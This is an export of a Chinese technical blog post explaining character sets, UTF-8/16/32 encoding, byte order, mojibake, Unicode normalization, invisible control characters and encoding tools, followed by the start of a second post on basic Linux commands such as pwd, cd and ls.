U+0000 - U+007F 0xxxxxxx 1 英语（基本拉丁字母）、数字、ASCII 标点、控制字符 U+0080 - U+07FF 110xxxxx 10xxxxxx 2 拉丁文扩展（é ñ 等）、希腊文、俄语西里尔字母、希伯来文、阿拉伯文 U+0800 - U+FFFF 1110xxxx 10xxxxxx 10xxxxxx 3 东亚文字（中文、日文假名、韩文音节）、越南文、泰文、天城文（印地语等）、大部分表情符号 U+10000 - U+10FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 4 罕见/扩展字符（CJK 扩展汉字、古代文字、乐谱符号、更多表情符号） 这些x是实际用来填充字符码点二进制位的地方，从右向左、从低位到高位填充\neg：汉字“中” (U+4E2D)\nUnicode 码点：U+4E2D 范围：4E2D在U+0800 - U+FFFF之间，所以需要 3 个字节 二进制表示：4E2D的二进制是0100 1110 0010 1101 (16位) 匹配模板：三字节模板是1110xxxx 10xxxxxx 10xxxxxx。这个模板共有4+6+6=16个x，正好容纳16位 填充 最右边的6个x填入最低的6位：001101 中间的6个x填入接下来的6位：111000 最左边的4个x填入最高的4位：0100 得到字节序列 1110 0100 -\u0026gt; E4 10 111000 -\u0026gt; B8 10 001101 -\u0026gt; AD 结果：汉字“中”的UTF-8编码是**E4 B8 AD** 这种设计确保了程序在任何位置开始读取字节流，都能准确判断出一个字符的起始和结束边界\nUTF-16 编码 UTF-16也是一种用于编码Unicode字符的格式\n它通常使用2个字节（对于BMP内的字符）或4个字节（对于辅助平面的字符）来表示一个字符\n由于其大部分情况下定长的特性，便于程序内部进行索引，因此被广泛用作许多系统和语言的内部内存表示，例如Windows操作系统内核、Java语言的String类型\nUTF-32 编码 类似UTF-16，它也是定长的，为每一个字符分配固定的4个字节（32位）来存储其Unicode码点值\n它和UTF-16一样，在文件存储和网络传输方面不如UTF-8流行，一个主要原因就是接下来要讲的字节序问题\n字节序 当一个字符需要用多个字节来表示时，就必须面对一个问题：\n这些字节应该按什么顺序存储？就像写数字258，是从左到右写 2, 5, 8，还是从右到左写8, 5, 2？\n这也就是所谓的字节序 —— 多字节数据在内存或文件中按字节排列的顺序\nUTF-8的编码规则中，字节内部的位顺序是固定的，没有所谓“高字节”和“低字节”的问题；而UTF-16和UTF-32是定长的，而且字节内部可以交换顺序，所以会有字节序区别\n常见的两种字节序：\n大端序 (Big-Endian, BE)：高位的有效字节存放在内存的低地址（大头在前）\n这符合人类的阅读习惯\n小端序 (Little-Endian, LE)：低位的有效字节存放在内存的低地址（小头在前）\n这在 x86 架构的计算机（我们日常使用的大多数 PC）中更为常见\n比如，字符 中的UTF-16编码 (U+4E2D) 是两个字节4E和2D：\n在大端序系统上，内存中存储为：... [地址1000]: 4E, [地址1001]: 2D ... 在小端序系统上，内存中存储为：... [地址1000]: 2D, [地址1001]: 4E ... 如果搞错了字节序，解码就会出错！\n为了解决这个问题，人们发明了BOM(Byte Order Mark)，它是一个放在文件开头的、不可见的特殊暗号字符（码点为 U+FEFF）\n通过读取文件开头的几个字节，以BOM为参考，程序就可以判断文件的字节序和编码：\n如果文件开头是FE FF，说明是UTF-16 大端序 如果文件开头是FF FE，说明是UTF-16 小端序 如果文件开头是EF BB BF，说明是UTF-8 正如前面所说，UTF-8本身没有字节序问题，它的BOM只是用来表明这是一个UTF-8文件\n然而，在Web开发和类Unix系统中，普遍推荐使用不带 BOM 的 UTF-8（UTF-8 without BOM），因为某些旧的脚本和工具可能不认识 BOM，并将其作为垃圾内容输出，导致页面顶部出现空行或其他问题\n理解了前面的字符集和编码，乱码的产生原因就非常清晰了\n乱码 乱码的唯一根源在于：用 A 编码方式存储的字节序列，却被当作 B 编码方式去解码和显示。\n这就像你拿到一份用中文密码本加密的信息，却错误地拿了一本俄文密码本去解密，结果自然是一堆谁也看不懂的天书\n字节本身是无辜的，它们只是一串0和1，真正的罪魁祸首是解码时错误的假设\n错误的翻译 —— GBK打开UTF-8文件 这是最常见的场景：我们用国际标准的UTF-8创建了文件，但它被一个只认识本地编码的旧程序打开了\n我们用 Python 写入一句话“你好，世界”，并明确使用utf-8编码保存，查看它UTF-8编码字节\ntext = \u0026#34;你好，世界\u0026#34; utf8_bytes = text.encode(\u0026#39;utf-8\u0026#39;) with open(\u0026#34;utf8.txt\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(utf8_bytes) print(utf8_bytes.hex().upper()) 输出：\nE4BDA0E5A5BDEFBC8CE4B896E7958C 我们再模拟一个旧程序用gbk编码去读取这个hello_utf8.txt文件：\nwith open(\u0026#34;utf8.txt\u0026#34;, \u0026#34;rb\u0026#34;) as f: byte_data = f.read() #errors=\u0026#39;replace\u0026#39; 表示遇到无法解码的字节时，用 \u0026#39;\u0026#39; 替换 garbled_text = byte_data.decode(\u0026#39;gbk\u0026#39;, errors=\u0026#39;replace\u0026#39;) print(garbled_text) 输出：\n浣犲ソ锛屼笘鐣� 这就是典型的乱码，因为utf-8下的E4BDA0...这串字节在GBK的字典里恰好对应了另一组完全不同的汉字\n“锟斤拷” 这个著名的乱码组合，就是源于将UTF-8编码的汉字，错误地用 GBK 或其他本地编码来显示\n它的成因非常特殊，它源于对“错误”本身的再次错误解读\n替换字符 这个故事的主角，是一个特殊的Unicode字符 —— 替换字符\n当一个程序在解码字节流时，如果遇到了一个不符合当前编码规则的、无法识别的无效字节序列，该怎么办？\n一个设计良好的程序不会崩溃，而是会遵循Unicode标准，在那个出错的位置插入一个官方的替换字符，也就是**U+FFFD**，它在屏幕上通常显示为一个黑色的菱形中间带一个问号\n错误的诞生 现在，让我们用代码来模拟它的产生过程：\n假设一个程序（比如数据库、文本编辑器等）在处理数据时，遇到了它无法理解的字节，作为安全措施，程序在内存中生成了两个Unicode替换字符，我们在Python中可以直接用它的码点 \\uFFFD 来表示：\nerror_text = \u0026#34;\\uFFFD\\uFFFD\u0026#34; 接下来，程序将包含这两个替换字符的字符串，以标准的UTF-8格式写入文件，一个U+FFFD的UTF-8编码是 3个字节：EF BF BD\nutf8_error = error_text.encode(\u0026#39;utf-8\u0026#39;) 现在，另一个程序（或用户）错误地使用 GBK 编码来读取这串字节，注意这里必须用 gbk 编码，如果用 gb2312会因字符不全而报错：\ntext = utf8_error.decode(\u0026#39;gbk\u0026#39;) print(f\u0026#34;GBK解码结果: \u0026#39;{text}\u0026#39;\u0026#34;) 结果：\n锟斤拷 其中过程是怎么样的？\n程序读取 EF BF BD EF BF BD这6个字节 GBK 解码器按两个字节一组来处理，因为它认为最高位是 1 的字节都是双字节字符的一部分： 读到**EF BF，去查GB码表，这对字节恰好对应了汉字锟** 接着读到**BD EF，再次去查GBK码表，这对字节也恰好有对应汉字斤** 最后读到**BF BD，第三次去查GBK码表，这对字节同样对应了一个汉字拷** 就这样，原本代表解码错误的、在UTF-8下有明确含义的字节序列，在 GBK解码器的一系列巧合误解之下，被翻译成了我们在座各位都无比熟悉的三个汉字——锟斤拷 锟斤拷是传播比较广泛的乱码，真正的乱码形式多种多样，网上有人整理了常见的乱码对照表：\n如果你不记得什么是ISO-8859-1：地区性字符集时代 表里面提到锟拷码是gbk读取两次的结果，其实就是utf-8 -\u0026gt;错误字符 -\u0026gt; 替换字符 -\u0026gt; 锟斤拷\n无能的编码检测 既然乱码是因编码不匹配产生的，那程序能自动检测文件的编码吗？\n答案是可以，但永远不可靠\n编码检测本质上是一种启发式猜测，线索极少\n程序会读取一部分字节，然后用各种常见编码的规则去试，并根据以下线索进行打分：\nBOM (Byte Order Mark)\n这是最可靠的线索，如果文件开头有EF BB BF，那几乎可以100%确定是UTF-8\n但我们上面也说过了，绝大多数文件（特别是网页）为了兼容性，并不带BOM\n无效字节序列\n编码有其严格的字节组合规则，如果在尝试用GBK解码时，出现了大量不符合其双字节规则的序列（像上面例子中的单个0xAA），那么程序就会认为这可能不是GBK\n统计学特征\n分析字节的分布规律，例如，一段英文文本如果用UTF-8编码，大部分字节都会在0-127范围内。而一段中文GBK文本，则会出现大量连续成对的大于127的字节\n然而，这种方法是不可靠的：\n对于短文本，样本太少，统计学方法完全失效\n巧合时有发生，有些字节序列在多种编码下恰好都是“合法”的，只是代表的意义不同\n在早期的windows版本中，如果使用写字板打开txt文件，输入“联通”两个字，此时是以GBK形式保存，但由于他们的编码恰好和utf-8的双字节格式相同（比如“联”是C1 AA，即11000001 10101010），阅读器错误的使用utf-8解码它们，就会导致乱码\n还有一个著名的例子就是短语Bush hid the facts，这也是一个在中文Windows系统上曾广为人知的文本显示乱码，当它以ASCII/UTF-8保存后，如果被程序错误地当作UTF-16LE来打开，会显示出几个汉字联 আরি󏐠或类似乱码\n所以，永远不要依赖自动检测！\n与其让接收方去费力猜测，不如让发送方在明确标注语言，现代协议和格式都会提供这种明确指定编码的机制\n例如：\nHTTP响应头：服务器在返回网页时，通过这个头信息告诉浏览器用什么编码来解析\nContent-Type: text/html; charset=utf-8 HTML文件头：在HTML文件内部，通过meta标签再次声明编码，作为服务器未发送上述头信息时的备用方案\n\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; XML文件头：XML文件在第一行就声明自己的编码\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; 说完了基础的，我们来说点高级的 —— 其实，Unicode远比“一个码点一个字”要复杂\n除了我们看得见的字符，还存在一套系统，用于处理字符的等价性问题、组合显示以及控制文本的复杂行为\n字符的变形 同形异义 同一个看起来一样的字符，在Unicode中可能有多种表示方式，这在计算机看来就是完全不同的东西\n比如一个带扬抑符的字母é，它就有两种表示方式：\n方式1 —— 预组合\n直接使用单个码点 U+00E9（é），就像一个现成的汉字一样\n方式2 —— 组合\n使用普通字母e（U+0065），后面紧跟一个“组合扬抑符” ´（U+0301）\n这就像汉字的一个偏旁部首，会自动“贴”到前一个字母的身上，组合成需要的样子\n这两种方式渲染出来的字形完全一样，但在计算机内部，它们的身份是完全不同的\n如果你在一个文本中搜索 U+00E9，将无法匹配到由U+0065 + U+0301组成的那个é\n历史渊源 你可能会奇怪为什么它会以两种方式存在，这其实和Unicode在设计时要兼顾的两个目标有关：\n兼容性 在 Unicode 出现之前，许多老字符集（如 Latin-1）已经有é这种“预组合”的单个字符\n为了兼容旧标准，Unicode 直接收录了这些单字符形式（U+00E9）\n可组合性 Unicode 希望支持所有语言的所有字符变化（比如加不同的重音、附加符号、数学标记等），但如果每种变化都单独收一个码点，字符集会无限膨胀\n所以，Unicode 定义了组合字符（Combining Characters）机制，允许用一个基本字母 + 一个或多个附加符号来动态组合成新字形（比如U+0065+U+0301）\n归一化标准 为了解决这个问题，Unicode 定义了四种归一化标准，用于将“看起来一样但编码不同”的字符串转换为统一的、规范的表示形式\nNFC (Normalization Form C – Composition)：组合\n先将字符分解，再尽可能组合为预组合形式（比如 e + ´ → é）\n这是 W3C 推荐在网页存储和传输中使用的标准，能够保证跨平台一致性\nNFD (Normalization Form D – Decomposition)：分解\n将字符尽可能分解为基本字符和组合标记（比如 é → e + ´）\n这种形式常用于需要分析字符结构或对附加符号单独处理的场景\nNFKC (Normalization Form KC – Compatibility Composition)：兼容性组合\n在NFC的基础上，先进行兼容性分解（把全角字符、特殊样式字符等转换为标准字符），再尽可能组合\n例如，Ｈｅｌｌｏ（全角）会被转成Hello\n适合搜索、匹配、用户输入标准化等场景\nNFKD (Normalization Form KD – Compatibility Decomposition)：兼容性分解\n在NFD的基础上，额外进行兼容性分解，将外观差异但语义等价的字符统一为标准形式，并保持分解状态\n例如，罗马数字 Ⅳ 会被分解为 I + V\n常用于文本分析、去除装饰性差异等任务\n前两种是比较常用的归一化方式\n特殊字符 Unicode中包含很多“看不见”但有特殊功能的字符，我们上面提到的用作BOM的就是其中一种\n零宽字符 看不见的字符 它们不占用任何宽度，肉眼不可见，但能产生特殊效果\n零宽空格 (ZWSP, U+200B)\n它用于在长单词或 URL 的中间建议一个“可以换行”的位置，而不会产生一个可见的空格\n例如，在 URL thisisaverylongurlthatmightoverflow 中间插入 ZWSP，当容器宽度不够时，浏览器就可以在这里优雅地换行，而不会破坏链接\n零宽连字 (ZWJ, U+200D)\n它用于“粘合”两个独立的字符，告诉渲染引擎将它们显示为一个组合的字形\n最著名的应用就是 Emoji 的组合： 👨 (男人) + ZWJ + 👩 (女人) + ZWJ + 👧 (女孩) + ZWJ + 👦 (男孩) = 👨‍👩‍👧‍👦 (家庭) ‍ (零宽连字) 本身不可见，但它像胶水一样把前后四个独立的 Emoji 粘合成了一个新的 Emoji\n零宽非连字 (ZWNJ, U+200C)\n与 ZWJ 相反，它用于“切断”本应自动连接的字符\n例如，在波斯语中，某些字母会自动与后面的字母连接，插入 ZWNJ 可以强制它们断开，以显示其非连接形式\n从左到右标记 (LRM, U+200E)\n一个不可见字符，用来强制后续字符以从左到右显示\n常用于混合方向文本中，确保英文或数字按正常方向显示。例如，在阿拉伯语句子中插入 LRM 可以保证英文单词正常显示。\n从右到左标记 (RLM, U+200F)\n类似 LRM，但强制后续字符以从右到左方向显示\n常用于拉丁字母或数字出现在阿拉伯语或希伯来语文本时，保证它们正确的右到左排列\n从左到右嵌入 (LRE, U+202A)\n它开始一段左到右的文本嵌入，后续字符强制从左到右显示，直到遇到对应的结束符\n在主要是阿拉伯语的文本中插入LRE和PDF，可让一段英文保持左到右排列\n从右到左嵌入 (RLE, U+202B)\n它开始一段右到左的文本嵌入，后续字符强制从右到左显示，直到遇到结束符\n在主要为英文的文本中插入RLE和PDF，使其中一段希伯来语正常右到左排列\n弹出方向格式 (PDF, U+202C)\n它用来结束先前的方向嵌入（LRE或RLE），恢复之前的文本方向\n例如：文本中出现LRE\u0026hellip;PDF或RLE\u0026hellip;PDF包裹的区域，PDF结束该嵌入状态\n从左到右覆盖 (LRO, U+202D)\n它强制后续字符全部以从左到右方向显示，覆盖其默认方向，直到遇到PDF\n例如：在包含阿拉伯语或希伯来语的混合文本中，强制某一部分以从左到右显示\n从右到左覆盖 (RLO, U+202E)\n与LRO相反，强制后续字符全部以从右到左方向显示，覆盖默认方向，直到遇到PDF\n这在恶意文本或混淆攻击中经常被用来制造视觉欺骗，因它会反转文字显示方向\n不可见乘号 (INVISIBLE TIMES, U+2062)\n表示数学隐式乘法操作，但不显示任何符号，常用于数学公式排版，变量间的隐式相乘\n不可见分隔符 (INVISIBLE SEPARATOR, U+2063)\n用作文本逻辑分隔符，但不显示任何空白或符号，方便文本内部逻辑处理\n零宽不间断空格 (ZWNBSP, U+FEFF)\n既是零宽的不可换行空格，也常用于Unicode文档的字节顺序标记（BOM）\n在文件开头可标识文本编码，但不应随意插入文本中，以免引起显示问题\nQQ的反转id 相信不少人都看见过qq群里有些人的id后面会跟着一个“喵”之类的恶搞字符\n当你@他时，这个字符竟然脱离了id，出现在了我们输入的话后面！这怎么回事？\n其实这就是使用了上面我们提到的零宽字符的两种：\nU+202E：从右至左覆盖 U+202D：从左至右覆盖 比如，我有一个id是这样的：\n快来艾特我\\u202E喵~\\u202D 因为是不可见字符，在别人眼里是看不见的（需要使用对应的编码工具，比如：unicode编码转换 ）：\n快来艾特我喵~ 当别人@我发言的时候（比如说“你好”，显示应该是@快来艾特我喵 你好），文字显示默认从左向右\n我们使用[]代表当前输入光标的位置，左右箭头代表输入方向：\n[]→ @[]→ @快[]→ @快来[]→ @快来艾[]→ @快来艾特[]→ @快来艾特我[]→ 读取到这里的时候，文本框看见了控制字符U+202E，它立刻变成了从左向右输入：\n@快来艾特我←[] @快来艾特我←[]喵 输入“喵”后，他又看见了控制字符U+202D，又变回了从右向左输入：\n@快来艾特我[]→喵 @快来艾特我你[]→喵 @快来艾特我你好[]→喵 输入完成之后最终效果：\n@快来艾特我你好喵 这就让别人喵喵叫啦\n零宽字符隐写 这种零宽字符还诞生了一种隐写方式 —— 零宽字符隐写（Zero-Width Character Steganography）\n隐写技术通过在正常文本的字符间插入零宽字符，或者利用不同零宽字符的组合，来编码隐藏信息\n例如，用零宽空格代表二进制的0，零宽非连接符代表1，或者通过插入或不插入零宽字符表示二进制位\n这样，隐藏的信息不会被普通阅读者察觉，因为文本外观没有变化\n你可以使用linux的vim编辑器打开，观察到\\u这样的隐写痕迹\n常用的隐写工具：\nhttps://330k.github.io/misc_tools/unicode_steganography.html https://yuanfux.github.io/zero-width-web/ 变体选择符 变体选择符是一类特殊的Unicode码点，通常紧跟在另一个字符后面，作用是“建议”或“指定”该字符的具体显示样式（字形变体），以保证不同平台或字体能正确显示\n常见变体选择符：\nU+FE0E（VS15，Variation Selector-15）表示文本形式，提示字符以普通文本风格显示 U+FE0F（VS16，Variation Selector-16）表示表情符号形式，提示字符以彩色Emoji风格显示 比如，Unicode字符U+2764是一个“心形”符号 ❤：\n单独使用：U+2764，显示可能是黑白符号，也可能是彩色Emoji，这依赖平台和字体 加上变体选择符：U+2764 U+FE0F，强制显示为彩色Emoji❤️ 加上变体选择符：U+2764 U+FE0E，强制显示为黑白文本 ❤︎ 讲了这么多，终于到实践的部分了\n到目前为止，我们讨论的都是计算机如何“理解”和“存储”字符\n现在，我们来看看在实际操作中，人类是如何与这个复杂的字符系统进行交互的\n工具与应用 输入法（Input Method Editor, IME） 输入法并非一个普通的应用程序，而是一个专为文本输入设计的、集成在操作系统中的系统级服务或中间件\n它的位置恰好位于物理键盘和当前聚焦的应用程序之间，为了让输入法能够“拦截”和“处理”按键，所有现代操作系统都提供了专门的框架来管理和集成它们：\nWindows: 文本服务框架 (Text Services Framework, TSF)\n这是一个先进的框架，允许输入法、手写识别、语音识别等多种文本服务以统一的方式与应用程序交互\n在早期，Windows使用的是一个较老的系统，名为输入法管理器 (Input Method Manager, IMM)\nmacOS: Input Method Kit\n这是苹果为开发者提供的、用于构建输入法的官方框架\nLinux: IBus (Intelligent Input Bus) \u0026amp; Fcitx (Flexible Context-aware Input Tool for X)\n它们都采用了一种“总线”式的架构，输入法作为服务挂载在总线上，为所有应用程序提供输入服务\n这些框架的核心作用，就是建立一套标准的通信协议，确保任何应用程序（只要它支持该框架）都能与任何输入法进行顺畅的对话，而无需关心对方的具体实现\n当我们在键盘上敲下字母到最终输入文字，经历了什么？\n我们以输入“你好”为例，一步一步看看它的过程：\n步骤一：事件拦截 物理按键触发\n当我们按下n键时，键盘硬件会将该按键对应的扫描码（Scan Code） 通过键盘控制器发送到计算机\n这只是一个硬件级的信号，还不知道“n”是什么意思\n操作系统接收与封装事件\n操作系统的输入子系统（如 Windows 的 Keyboard Class Driver、Linux 的 evdev）接收到扫描码，将其转换成虚拟键码\n这一阶段还只是“按下了哪个键”的信息，不涉及语言文字\nIME 输入法拦截\n在操作系统将键盘事件传递给当前活动应用程序（比如聊天窗口）之前，事件会先经过输入法框架\n如果当前有 IME 处于激活状态，它会拦截并消费这个按键事件 —— 这意味着这个按键不会直接传给应用，而是先进入输入法的内部处理逻辑\n建立输入上下文\nIME会根据当前的焦点控件（例如一个可编辑文本框）建立一个输入上下文，用来记录本轮输入的状态：\n已输入的编码（例如拼音串nihao） 光标位置 候选词列表 用户选择历史 这一步相当于输入法开了一个“草稿本”，专门记录你正在打的这段文字\n生成组合字符串\n输入法会将已输入的编码（如n → ni → nih → nihao）显示在屏幕上\n这段带虚线或高亮的临时文字被称为组合字符串，它不是应用程序缓冲区里的正式文本，而是由输入法通过IME接口直接绘制到光标位置上的\n在这个阶段，应用程序并不知道这些字母是什么 —— 它只知道光标处有一个正在编辑的输入会话\n步骤二：转换引擎 这是输入法最核心的部分，转换引擎根据缓冲区中的nihao，开始计算所有可能的候选结果\n转换引擎主要依赖两个东西 —— 词库和语言模型：\n1.词库\n存储大量词语及其拼音（或其他编码）对应关系的数据集合\n静态词库\n输入法出厂时内置的、包含数百万词条的巨大数据库。它定义了拼音与汉字、词语之间的基础对应关系\n动态/用户词库\n记录你个人常用词汇的词典。你输入过的名字、昵称、专业术语都会被添加进来，下次输入时就会优先显示\n云端词库\n现代输入法的“联网大脑”。它能实时从互联网上抓取最新的流行语、新闻热点、人名地名，让你的输入法永远“与时俱进”\n2.语言模型\n如果说词典是认字，那么语言模型就是理解语法和语境，它负责从众多同音词中，猜出你最想要的那一个\nN-gram 模型\n这是统计学模型，它通过分析海量文本数据，计算出词语组合的概率\n例如，它知道 P(好 | 你)（在“你”之后出现“好”的概率）要远远大于 P(耗 | 你)，因此，你好的排序会非常靠前\n更先进的模型（HMM, CRF, AI）\n现代输入法普遍采用更复杂的统计模型，甚至是深度学习神经网络（如 RNN/LSTM）\n这些模型不仅看前一个词，还会综合分析整个句子的结构和语义，从而做出惊人准确的预测\n例如，当你输入jintianwanshangwomenyiqiqu时，它能直接预测出 今天晚上我们一起去，而不是一堆不相关的单字\n步骤三：候选界面 生成列表\n转换引擎将计算出的结果，按照概率从高到低排序，生成一个候选列表\n渲染窗口\n输入法的界面模块（UI）获取这个列表，然后在屏幕上绘制出我们熟悉的候选窗口\n这个窗口是一个独立的、悬浮在所有应用之上的图层，由输入法完全控制\n步骤四：文本提交 用户选择\n用户通过按空格、数字键或鼠标点击，在候选窗口中选择了 你好\n发送指令\n输入法收到用户的选择后，会向操作系统的文本服务框架发送一个提交文本的指令\n内容交付\n这个指令里装的，就是最终确定的字符串 你好\n更底层地看，是这两个字符的Unicode 码点序列 (U+4F60, U+597D)\n应用接收\n应用程序的文本框接收到这个指令，就像接收到用户用剪贴板粘贴进来一段文本一样\n它将这两个字符插入到自己的文本缓冲区中\n最终渲染\n应用程序调用系统的字体渲染引擎，根据当前设置的字体，将U+4F60和U+597D对应的字形绘制到屏幕上\n至此，输入法绘制的临时草稿（带下划线的nihao和候选窗口）消失，你好这两个字被正式地写入了应用程序，整个输入流程完成\n编码转换工具和库 在处理来自不同年代、不同地区、不同系统的数据时，编码不一致是家常便饭：\n我们可能需要将一个使用GBK编码的旧网站数据库，迁移到新的、使用UTF-8的系统中\n用户可能会上传各种奇奇怪怪编码的文本文件，我们的程序需要有能力正确识别和处理它们\n我们调用的某个古老API接口，可能只接受GBK编码的请求\n因此，编码转换很重要\niconv iconv是一个乎所有类Unix系统都自带的跨平台命令行工具和编程库，专门用于字符编码的转换\n格式：\niconv -f \u0026lt;源编码\u0026gt; -t \u0026lt;目标编码\u0026gt; \u0026lt;输入文件\u0026gt; -o \u0026lt;输出文件\u0026gt; 常用参数：\n参数 作用说明 -f 或 \u0026ndash;from-code 指定输入文本的字符编码格式 -t 或 \u0026ndash;to-code 指定输出文本的字符编码格式 -l 或 \u0026ndash;list 列出支持的所有编码格式 -o 或 \u0026ndash;output 指定输出文件（否则输出到标准输出） -c 忽略非法输入字符（转换时跳过错误字符） \u0026ndash;verbose 显示详细的转换过程信息 eg：将一个GBK编码的文件转换为UTF-8编码的格式\niconv -f GBK -t UTF-8 gbk.txt -o utf8.txt ICU ICU（International Components for Unicode，Unicode国际组件）是一个由IBM（International Business Machines Corporation,国际商业机器公司）开发和维护的、功能极其强大的C/C++和Java库，后来交由了Unicode联盟管理\n其他语言也可以通过绑定或封装调用ICU库来使用大部分核心功能，但可能需要额外安装或配置\nICU不止是一个编码转换工具，还是一套全方位的国际化解决方案\n它提供比iconv更强大、更健壮的编码转换功能，支持超过200种编码，还有以下功能：\n字符归一化\n可以轻松地将字符串转换为NFC或NFD等范式\n排序\n它能实现真正符合语言习惯的排序\n例如，简单的按字节排序会将b 排在 á 前面，但ICU知道在西班牙语中它们应该如何正确排序\n对于中文，它可以实现按拼音、部首或笔画排序\n日期、时间、数字、货币格式化\n它可以根据不同国家/地区（Locale）的习惯，将同一个日期2025-08-13格式化为8/13/2025(美国)或 13/08/2025(英国)\n文本边界分析\n它能准确地识别出单词、句子、段落的边界，这对于文本处理和搜索引擎至关重要\n编程语言 现代主流编程语言都内置了强大的字符串和编码处理能力，通常足以应对日常的转换需求\n比如python内部使用unicode表示字符串，并提供了.encode()和.decode()方法，之前的示例中我们也使用过\neg1：将GBK字节流转换为unicode字符串\ngbk = b\u0026#39;\\xc4\\xe3\\xba\\xc3\u0026#39; # \u0026#34;你好\u0026#34; 的 GBK 字节 unicode= gbk.decode(\u0026#39;gbk\u0026#39;) eg2：接上一例，将unicode字符串编码为UTF-8字节流\nutf8 = unicode.encode(\u0026#39;utf-8\u0026#39;) Java, JavaScript, Go, Rust 等也都提供了类似的API，使得我们可以方便地在代码层面处理编码问题\n到这里，一切的一切也就结束了\n这篇文章诞生原因其实是在学linux命令的时候时常涉及字符、字等等东西，再加上以前看过不少相关文章视频，兴趣使然才写下了这些文字\n编码的世界远比我想象的复杂，本文也只是冰山一角、抛砖引玉之作，系统的学习还要综合网上的资料才行\n不管怎么样，希望能对你有所帮助\n","date":"2025-08-13T14:32:41+08:00","image":"http://picture.928330.xyz/typora/unicode-101-introduction.social.jpg","permalink":"https://blog.928330.xyz/p/%E4%B8%80%E6%96%87%E5%BC%84%E6%87%82%E5%AD%97%E7%AC%A6%E9%9B%86%E4%B8%8E%E7%BC%96%E7%A0%81/","title":"一文弄懂字符集与编码"},{"content":"系统地学习linux命令 —— 这是我从接触linux以来就一直想要做的一件事，可是始终没有找到时间\n现在终于得闲了，嘻嘻\n我个人认为，与其单独地学习linux的知识点，不如从常见的命令开始，跟着命令一起学习\n而且依照知识点和命令循序渐进，对于初学者应该也比较容易接受\n于是就有了这篇文章\npwd —— 显示当前工作目录的完整路径 pwd全称是 print working directory，用于显示当前终端所在的工作目录的完整路径\n语法格式 pwd [参数] pwd命令通常不与路径参数一起使用，因为它总是显示当前所在的位置\nLinux工作目录 在Linux中，每个进程（包括正在使用的shell终端）都有一个当前工作目录，我们执行的所有相对路径命令都是基于这个目录的 路径分为物理路径和逻辑路径，物理路径是文件系统上不包含任何符 号链接的真实路径，逻辑路径则可能包含符号链接，pwd命令可以在这两种路径之间进行切换 常用参数 pwd的参数非常少，主要就是以下两个，用于处理符号链接的情况：\n参数 功能说明 -L 逻辑路径\n显示包含符号链接的路径，这是大多数shell中的默认行为。 -P 物理路径\n显示解析所有符号链接后的真实物理路径，不包含.或.. 使用示例 没有示例，这个很简单，自己用去吧\ncd —— 切换当前工作目录 cd全名change directory(改变目录)，其功能是切换用户当前所在工作目录\n语法格式 cd [参数] \u0026lt;目标路径\u0026gt; Linux路径与特殊目录 绝对路径：从根目录/开始的完整路径，例如/home/user/documents 相对路径：从当前工作目录开始的路径，不以/开头，例如../pictures 特殊目录快捷方式： ~：当前用户的主目录 -：上一次所在的目录 .：当前目录 ..：上一级目录 常用参数 参数 功能说明 -L 遵循逻辑路径\n如果要切换到的目录是一个符号链接，则进入该符号链接本身。这是默认行为 -P 遵循物理路径\n在切换目录前，解析所有的符号链接，直接进入其指向的真实物理目录 使用示例 使用绝对路径切换到系统日志目录\ncd /var/log 使用相对路径进入当前目录下的子目录\ncd dir 返回主目录，有两种方式\n不带任何参数：\ncd 或者使用~快捷方式：\ncd ~ 切换到上一级目录 —— 这是日常操作中使用频率非常高的命令\ncd .. 在当前目录和上一个目录之间切换\ncd - 切换到包含特殊字符的目录\ncd \u0026#34;My Documents\u0026#34; 如果目录名包含空格或其它特殊字符，需要用引号将其包裹起来\nls —— 显示目录中的文件及其属性信息 语法格式 ls [参数] \u0026lt;文件目录名\u0026gt; Linux的目录特点 linux文件或者目录名称最长可达256个字符\n以.开头的文件是隐藏文件，需要用-a参数才能显示\n.代表当前目录\n..代表上一级目录\nLinux匹配技法 使用命令对文件进行操作的时候，如果有很多文件需要处理，我们一个个去寻找、执行，那就太过耗时\n为了减少时间，我们可以使用正则，也能使用shell自带的匹配方式，下面就来介绍两种\n通配符与PATTERN Linux通配符是shell提供的一种字符模式匹配机制（PATTERN），常用于文件名匹配与路径匹配\n它属于通配符扩展机制，不是正则表达式，但语法上有些相似\n星号：* *可以匹配任意数量的任意字符（包括 0 个字符）\n匹配所有以 .txt 结尾的文件：\nls *.txt 匹配所有以 file 开头的文件：\nls file* 问号：? ?可以匹配任意一个字符\n匹配file1.txt、fileA.txt，但不匹配file10.txt：\nls file?.txt 中括号：[] 匹配[]内的任意一个字符或字符范围\n匹配 file1.txt、file2.txt、file3.txt：\nls file[123].txt 在[]中使用连字符-表示字符范围\n匹配 filea.txt 到 filez.txt 的所有单个字母文件：\nls file[a-z].txt 可加 ^ 或 ! 表示取反（排除匹配）\n匹配不包含小写字母的文件名：\nls file[!a-z].txt 大括号扩展 大括号扩展用于生成字符串序列，执行前由shell展开，并不会匹配文件名\n简单列举 格式：\n\u0026lt;前缀\u0026gt;{值1,值2,...}\u0026lt;后缀\u0026gt; eg：\necho file{A,B,C}.txt 展开为fileA.txt fileB.txt fileC.txt\n数字序列 格式：\n{起始..结束} eg：\necho file{1..5}.txt 展开为file1.txt file2.txt file3.txt file4.txt file5.txt\n字符序列 格式：\n{a..z} eg：\necho {a..d} 展开为a b c d\n带步进的序列 格式：\n{起始..结束..步长} eg：\necho {1..10..2} 展开为1 3 5 7 9\n嵌套大括号 多个括号组合使用，会展开所有组合方式\neg：\necho {A,B}{1,2} 展开为 A1 A2 B1 B2\n常用参数 内容显示 参数 功能说明 -a 显示所有文件及目录，包括.开头的隐藏目录 -A 不显示当前目录(.)和父目录(..) -R 递归显示所有子文件 -d 只显示目录本身，不列出目录内容 -i 显示文件的 inode 号码 -l 显示文件的详细信息，包含权限、所有者、大小、修改时间等 -h 与-l一起使用，以更易读的单位（如K, M, G）来显示文件大小 -s 显示文件占用的磁盘块数 -L 显示符号链接指向文件的详细信息 \u0026ndash;full-time 显示完整时间戳（精确到秒） 格式控制 参数 功能说明 -m 水平显示文件信息\n间隔符是逗号 -F 在文件名后附加一个字符以表示文件类型：\n/代表目录，*代表可执行文件，@代表符号链接 -p 在目录名的末尾加上一个斜杠/\n与-F类似但更简洁 -1 强制每行只显示一个文件\n没有-2，-3.. \u0026ndash;color=never/auto/always 